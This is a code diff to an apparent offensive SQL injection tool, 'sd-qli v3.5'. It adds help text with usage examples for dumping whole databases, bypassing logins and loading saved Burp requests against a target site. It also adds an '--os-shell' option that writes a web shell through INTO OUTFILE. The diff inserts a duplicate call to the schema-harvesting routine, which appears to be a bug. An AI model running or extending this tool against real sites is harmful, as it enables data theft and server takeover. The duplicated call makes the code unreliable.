@@ -394,7 +394,10 @@ class SDQLi:
         print(f"[*] Starting full schema exfiltration...")
         self.automate_harvest(param_name, current_params, column_count, ref_idx, prefix=start_val)
         
-        self.check_os_shell(param_name, current_params, column_count, ref_idx)
+        self.automate_harvest(param_name, current_params, column_count, ref_idx, prefix=start_val)
+        
+        if self.args and self.args.os_shell:
+            self.check_os_shell(param_name, current_params, column_count, ref_idx)
         current_params[param_name] = original_val
 
     def automate_harvest(self, param_name, current_params, col_count, ref_idx, prefix=None):
@@ -658,7 +661,58 @@ class SDQLi:
         print("="*75)
 
 def main():
-    parser = argparse.ArgumentParser(description='sd-qli v3.5 Ultimate Industrial')
+    parser = argparse.ArgumentParser(
+        description='sd-qli v3.5 - Ultimate Industrial SQL Injection Scanner',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+╔══════════════════════════════════════════════════════════╗
+║                     QUICK EXAMPLES                       ║
+╚══════════════════════════════════════════════════════════╝
+
+BASIC SCAN:
+  python3 sd-qli.py -u "http://target.com/index.php?id=1"
+
+FULL AUDIT (Databases -> Tables -> Columns -> Dump):
+  python3 sd-qli.py -u "http://target.com/news.php?id=1" --dbs --dump-all
+
+SPECIFIC TARGETING:
+  python3 sd-qli.py -u "http://target.com/news.php?id=1" -D users_db -T admin_table --dump
+
+POST REQUEST (Aggressive Login Bypass Check):
+  python3 sd-qli.py -u "http://target.com/login.php" --data "user=admin&pass=123"
+
+RAW REQUEST FILE (Saved from Burp/Zap):
+  python3 sd-qli.py -r request.txt
+
+╔══════════════════════════════════════════════════════════╗
+║                    FLAG DESCRIPTIONS                     ║
+╚══════════════════════════════════════════════════════════╝
+
+TARGETING:
+  -u, --url       Target URL. Must include http:// or https://.
+  -r, --request   Load HTTP request from a file (Raw format). 
+                  Parses headers, cookies, and data automatically.
+  -m, --method    HTTP Method (GET, POST). Default: GET.
+  -d, --data      POST data string (e.g., "id=1&debug=on").
+
+ENUMERATION:
+  --dbs           Enumerate available database names.
+  --tables        Enumerate tables in the current (or specified) DB.
+  --columns       Enumerate columns in the specified table.
+  --dump          Dump table entries (default: 20 rows).
+
+SPECIFICITY:
+  -D              Target Database to enumerate.
+  -T              Target Table to enumerate.
+  -C              Target Columns (comma-separated).
+
+EXPLOITATION:
+  --os-shell      Attempt to write a Web Shell via INTO OUTFILE (Danger).
+
+PERFORMANCE:
+  -w, --workers   Number of concurrent threads (Default: 10).
+        """
+    )
     parser.add_argument('-u', '--url', help='Target URL')
     parser.add_argument('-m', '--method', default='GET', help='Method')
     parser.add_argument('-d', '--data', help='POST data')
@@ -668,6 +722,7 @@ def main():
     parser.add_argument('--tables', action='store_true', help='Enumerate tables')
     parser.add_argument('--columns', action='store_true', help='Enumerate columns')
     parser.add_argument('--dump', action='store_true', help='Dump table entries')
+    parser.add_argument('--os-shell', action='store_true', help='Attempt Web Shell')
     parser.add_argument('-D', dest='db', help='Target Database')
     parser.add_argument('-T', dest='table', help='Target Table')
     parser.add_argument('-C', dest='col', help='Target Columns')
